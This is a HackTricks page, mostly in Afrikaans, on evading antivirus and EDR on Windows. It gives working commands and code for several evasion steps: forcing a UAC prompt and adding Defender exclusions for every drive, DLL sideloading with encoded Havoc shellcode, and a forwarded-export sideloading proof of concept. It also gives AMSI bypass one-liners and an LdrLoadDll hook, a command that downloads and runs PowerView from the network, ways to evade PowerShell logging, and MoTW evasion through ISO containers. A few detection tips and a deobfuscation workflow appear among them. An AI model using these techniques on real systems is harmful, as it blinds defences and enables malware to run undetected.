# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Deaktiveer Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender te laat ophou werk deur 'n ander AV voor te gee.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-styl UAC-lokaas voor inmenging met Defender

Publieke loaders wat as game cheats vermom is, word dikwels as ongetekende Node.js/Nexe-installers gestuur wat eers **die gebruiker vra om verhoogde regte** en eers daarna Defender neuter. Die vloei is eenvoudig:

1. Toets vir 'n administratiewe konteks met `net session`. Die opdrag slaag slegs wanneer die aanroeper admin rights het, dus dui 'n mislukking aan dat die loader as 'n standaard gebruiker loop.
2. Herbegin onmiddellik homself met die `RunAs` verb om die verwagte UAC-toestemmingsprompt te veroorsaak terwyl die oorspronklike opdragreël bewaar word.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Slagoffers glo reeds dat hulle “cracked” sagteware installeer, so die bevestigingsprompt word gewoonlik aanvaar, wat die malware die regte gee wat dit benodig om Defender se beleid te verander.

### Algemene `MpPreference` uitsluitings vir elke skyfletter

Sodra verhoogde regte verkry is, maksimeer GachiLoader-style chains Defender se blinde kolle in plaas daarvan om die diens heeltemal uit te skakel. Die loader maak eers die GUI-waghouer dood (`taskkill /F /IM SecHealthUI.exe`) en druk dan **uiters wye uitsluitings** sodat elke gebruikersprofiel, stelselgids en verwyderbare skyf nie geskandeer kan word nie:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Die lus gaan deur elke aangekoppelde lêerstelsel (D:\, E:\, USB sticks, ens.) so **enige toekomstige payload wat êrens op die skyf afgegooi word, word geïgnoreer**.
- Die `.sys`-uitbreiding-uitsluiting is vooruitdenkend—aanvallers hou die opsie oop om later unsigned drivers te laai sonder om weer aan Defender te raak.
- Alle veranderinge beland onder `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, wat later fases toelaat om te bevestig dat die uitsluitings voortduur of om dit uit te brei sonder om UAC weer te aktiveer.

Aangesien geen Defender-diens gestop word nie, bly naïewe health checks “antivirus active” rapporteer selfs al raak real-time inspeksie daardie paaie nooit nie.

## **AV Evasion Methodology**

Tans gebruik AVs verskillende metodes om te bepaal of 'n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige strings of reekse van bytes in 'n binary of script te flag en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat vasvang, aangesien dit waarskynlik al ontleed en as kwaadwillig aangemerk is. Daar is 'n paar maniere om hierdie tipe opsporing te omseil:

- **Encryption**

As jy die binary enkripteer, sal AV geen manier hê om jou program te herken nie, maar jy sal 'n soort loader nodig hê om die program in memory te ontsleutel en uit te voer.

- **Obfuscation**

Soms is dit alles wat nodig is om sommige strings in jou binary of script te verander om by AV verby te kom, maar dit kan tydrowend wees, afhangend van wat jy probeer obfusceer.

- **Custom tooling**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte signatures wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> 'n Goed manier om teen Windows Defender se static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit verdeel basies die lêer in meerdere segmente en laat Defender elke segment afsonderlik scan, so dit kan jou presies sê watter strings of bytes in jou binary geflag is.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion kyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binary in 'n sandbox uitvoer en kyk vir kwaadwillige aktiwiteit (bv. probeer om jou browser se wagwoorde te decrypt en te lees, 'n minidump op LSASS uitvoer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om teen te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dynamic analysis te omseil. AV's het 'n baie korte tyd om lêers te scan om nie die gebruiker se werkvloei te onderbreek nie, so die gebruik van lang sleeps kan die analise van binaries ontwrig. Die probleem is dat baie AV sandboxes net die sleep kan oorskiet, afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die fan speeds te kontroleer; nie alles word in die sandbox geïmplementeer nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se workstation by die "contoso.local" domain aangesluit is, kan jy 'n check op die rekenaar se domain doen om te sien of dit ooreenstem met die een wat jy gespesifiseer het; as dit nie ooreenstem nie, kan jou program exit.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, so jy kan vir die computer name in jou malware kyk voor detonasie; as die naam ooreenstem met HAL9TH beteken dit dat jy in Defender se sandbox is, en jy kan jou program laat exit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar baie goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir teenwerk teen Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Soos ons vroeër in hierdie post gesê het, sal **public tools** uiteindelik **get detected** word, so jy moet jouself iets afvra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander projek gebruik wat minder bekend is en ook LSASS dump?

Die regte antwoord is waarskynlik laasgenoemde. Neem mimikatz as voorbeeld: dit is waarskynlik een van, zo nie die mees gevlagte stuk malware deur AVs en EDRs nie; al is die projek baie cool, dit is ook 'n nagmerrie om daarmee te werk om rond AVs te kom, so soek net alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir evasion wysig, maak seker om **turn off automatic sample submission** in Defender, en asseblief, ernstig, **DO NOT UPLOAD TO VIRUSTOTAL** as jou doel is om op die langtermyn evasion te bereik. As jy wil kyk of jou payload deur 'n sekere AV opgespoor word, installeer dit op 'n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Wanneer dit moontlik is, prioritiseer altyd die gebruik van DLLs vir evasion; volgens my ervaring word DLL files gewoonlik **veel minder gedetecteer** en ontleed, so dit is 'n baie eenvoudige truuk om in sekere gevalle opsporing te vermy (as jou payload natuurlik 'n manier het om as 'n DLL te loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n detection rate van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 detection rate het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nou gaan ons 'n paar truuks wys wat jy met DLL files kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL search order wat deur die loader gebruik word deur die slagoffer-program en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme wat kwesbaar is vir DLL Sideloading nagaan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys van programme vatbaar vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitset.

Ek beveel sterk aan dat jy **verken DLL Hijackable/Sideloadable programs jouself**, hierdie tegniek is redelik onopvallend as dit behoorlik gedoen word, maar as jy publiek-bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur 'n kwaadwillige DLL te plaas met die naam wat 'n program verwag om te laai, sal dit nie noodwendig jou payload laai nie, omdat die program sekere spesifieke funksies binne daardie DLL verwag. Om hierdie probleem op te los, gebruik ons 'n ander tegniek genaamd **DLL Proxying/Forwarding**.

**DLL Proxying** stuur die oproepe wat 'n program maak van die proxy (en kwaadwillige) DLL na die oorspronklike DLL deur, en behou sodoende die program se funksionaliteit en maak dit moontlik om die uitvoering van jou payload te hanteer.

Ek sal die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon, en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 detectiekoers op [antiscan.me](https://antiscan.me)! Ek sou dit 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel sterk aan dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer in-diepte te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit opgelos via die normale soekvolgorde.

PoC (kopieer-plak):
1) Kopieer die getekende stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die forward met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) laai die side-by-side `keyiso.dll` (signed)
- Terwyl dit `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, kry jy eers "missing API" fout nadat `DllMain` reeds geloop het

Jagwenke:
- Fokus op forwarded exports waar die teikenmodule nie 'n KnownDLL is nie. KnownDLLs is gelys onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opnoem met gereedskap soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporing/verdedigingsidees:
- Monitor LOLBins (e.g., rundll32.exe) wat signed DLLs van nie-stelselpaaie laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam uit daardie gids
- Waarsku op proses-/module-kettings soos: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paaie
- Dwing code-integriteitsbeleid af (WDAC/AppLocker) en weier write+execute in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n onopvallende wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat-en-muisspeletjie — wat vandag werk, kan môre gedetekteer word, so moenie ooit net op een tool staatmaak nie; as dit moontlik is, probeer om verskeie ontwijkingstegnieke aan mekaar te koppel.

## AMSI (Anti-Malware Scan Interface)

AMSI is geskep om "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" te voorkom. Aanvanklik kon AVs slegs **lêers op skyf** skandeer, so as jy op een of ander manier payloads **direk in geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, omdat dit nie genoeg sigbaarheid gehad het nie.

Die AMSI-funksie is geïntegreer in hierdie komponente van Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit stel antivirus-oplossings in staat om skripgedrag te inspekteer deur skripinhoud bloot te stel in 'n vorm wat onversleuteld en nie-geobfuskeer is nie.

Die uitvoering van `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` sal die volgende waarskuwing in Windows Defender veroorsaak.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Let daarop dat dit `amsi:` vooraf sit en dan die pad na die uitvoerbare program waarvandaan die skrip gehardloop het, in hierdie geval, powershell.exe

Ons het nie 'n lêer op die skyf neergesit nie, maar is steeds in die geheue gevang weens AMSI.

Boonop, beginne met **.NET 4.8**, word C#-kode ook deur AMSI gelei. Dit beïnvloed selfs `Assembly.Load(byte[])` om in-geheue uitvoering te laai. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-geheue uitvoering as jy AMSI wil ontwyk.

Daar is 'n paar maniere om om AMSI te kom:

- **Obfuscation**

Aangesien AMSI hoofsaaklik met statiese detections werk, kan dit 'n goeie manier wees om die skripte wat jy probeer laai te wysig om detectie te ontwy.

Echter, AMSI het die vermoë om skripte te deobfuskeer selfs al het dit meerdere lae, so obfuscation kan 'n slegte opsie wees afhangend van hoe dit gedoen is. Dit maak dit nie noodwendig eenvoudig om te ontduik nie. Soms is dit egter genoeg om 'n paar veranderlike name te verander en sal dit klaarkom, dus hang dit af van hoeveel iets gemerk is.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell-proses (ook cscript.exe, wscript.exe, ens.) te laai, is dit moontlik om dit te manipuleer selfs wanneer 'n ongeprivilegieerde gebruiker aan die gang is. As gevolg van hierdie fout in die implementering van AMSI, het navorsers verskeie maniere gevind om AMSI-skandering te ontwrig.

**Forcing an Error**

Om die AMSI-initialisering te dwing om te misluk (amsiInitFailed) sal daartoe lei dat daar geen skandering vir die huidige proses geïnisieer word nie. Oorspronklik is dit bekend gemaak deur [Matt Graeber](https://twitter.com/mattifestation) en Microsoft het 'n handtekening ontwikkel om wyer gebruik te voorkom.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles wat dit geneem het, was een reël powershell code om AMSI onbruikbaar te maak vir die huidige powershell-proses. Hierdie reël is natuurlik deur AMSI self gemerk, so 'n paar wysigings is nodig om hierdie tegniek te gebruik.

Hier is 'n gewysigde AMSI bypass wat ek vanaf hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie pos verskyn, so jy moet geen kode publiseer as jou plan is om onopgemerk te bly nie.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde uiteensetting.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokkeer AMSI deur te verhoed dat amsi.dll gelaai word (LdrLoadDll hook)

AMSI word eers geïnitialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taal‑onafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die versoekte module `amsi.dll` is. Gevolglik laai AMSI nooit en vind daar geen skanne vir daardie proses plaas nie.

Implementasie-oorsig (x64 C/C++ pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en pasgemaakte loaders (alles wat anders AMSI sou laai).
- Kombineer dit met die invoer van skripte via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Is waargeneem by loaders wat deur LOLBins uitgevoer word (bv. `regsvr32` wat `DllRegisterServer` aanroep).

This tools [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) also generates script to bypass AMSI.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses vir die AMSI-handtekening te deursoek en dit dan oor te skryf met NOP-instruksies, wat dit effektief uit die geheue verwyder.

**AV/EDR-produkte wat AMSI gebruik**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind by **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Gebruik PowerShell weergawe 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI hulle skandeer. Jy kan dit so doen:
```bash
powershell.exe -version 2
```
## PS-logboeking

PowerShell-logging is 'n funksie wat jou toelaat om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word, te registreer. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook 'n **probleem wees vir aanvallers wat opsporing wil ontduik**.

To bypass PowerShell logging, you can use the following techniques:

- **Deaktiveer PowerShell-transkripsie en module-logging**: Jy kan 'n instrument soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Gebruik PowerShell weergawe 2**: As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, so jy kan jou skripte uitvoer sonder dat AMSI dit skandeer. Jy kan dit doen: `powershell.exe -version 2`
- **Gebruik 'n Unmanaged Powershell-sessie**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n PowerShell-sessie sonder verdedigingsmeganismes te skep (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuskering

> [!TIP]
> Verskeie obfuskeringstegnieke berus op die enkripsie van data, wat die entropy van die binary sal verhoog en dit vir AVs en EDRs makliker sal maak om dit op te spoor. Wees versigtig hiermee en gebruik enkripsie moontlik slegs op spesifieke gedeeltes van jou kode wat sensitief is of weggesteek moet word.

### Deobfuskering van ConfuserEx-beskermde .NET-binaries

Wanneer jy malware analiseer wat ConfuserEx 2 (of kommersiële vorke) gebruik, is dit algemeen om verskeie beskermingslae te ontmoet wat dekompilleerders en sandbokse sal blokkeer. Die onderstaande werkstroom herstel betroubaar 'n byna oorspronklike IL wat daarna in C# gedekompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering-verwydering – ConfuserEx enkripteer elke *method body* en dekripteer dit binne die *module* statiese konstruktor (`<Module>.cctor`). Dit patch ook die PE-checksum, sodat enige wysiging die binary laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te vind, die XOR-sleutels te herwin en 'n skoon assembly te herskryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die uitset bevat die 6 anti-tamper-parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Simbool-/kontrole-vloei-herstel – voer die *skoon* lêer in by **de4dot-cex** ( 'n ConfuserEx-bewuste vork van de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Vlae:
• `-p crx` – kies die ConfuserEx 2-profiel
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, klasse en veranderlike name herstel en konstante stringe dekripteer.

3.  Proxy-call-verwydering – ConfuserEx vervang direkte metode-oproepe met liggewig-omslagters (ook bekend as *proxy calls*) om dekompilering verder te breek. Verwyder hulle met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's soos `Convert.FromBase64String` of `AES.Create()` te sien in plaas van ondoorgrondelike omslagfunksies (`Class8.smethod_10`, …).

4.  Handmatige skoonmaak – hardloop die resulterende binary in dnSpy, soek na groot Base64-blobs of gebruik van `RijndaelManaged`/`TripleDESCryptoServiceProvider` om die *werklike* payload te lokaliseer. Dikwels stoor die malware dit as 'n TLV-geënkodeerde byte-array geïnitialiseer binne `<Module>.byte_0`.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat jy die kwaadwillige monster hoef te laat loop – nuttig wanneer jy op 'n aflyn werkstasie werk.

> 🛈  ConfuserEx genereer 'n pasgemaakte attribuut genaamd `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### Eenreël
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) compilasie-suite te verskaf wat verhoogde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om, tydens kompilasie, obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework, wat die lewe van iemand wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat in staat is om verskeie verskillende PE files te obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitraire executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fijnkorrelige code obfuscation framework vir LLVM-supported tale wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op die assembly code vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike begrip van normale control flow dwarsboom.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL in shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy sekere uitvoerbare lêers vanaf die internet aflaai en uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmekanisme wat daarop gemik is om die eindgebruiker te beskerm teen die hardloop van potensieel kwaadwillige applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik met 'n reputasie-gebaseerde benadering, wat beteken dat seldsame afgelaaide applications SmartScreen sal aktiveer, en sodoende die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, saam met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Kontroleer die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om daarop te let dat executables wat met 'n trusted signing certificate onderteken is, nie SmartScreen sal trigger nie.

'n Baie effektiewe manier om te voorkom dat jou payloads die Mark of The Web kry, is om dit in 'n soort container soos 'n ISO in te pak. Dit gebeur omdat Mark-of-the-Web (MOTW) **nie** op **non NTFS** volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

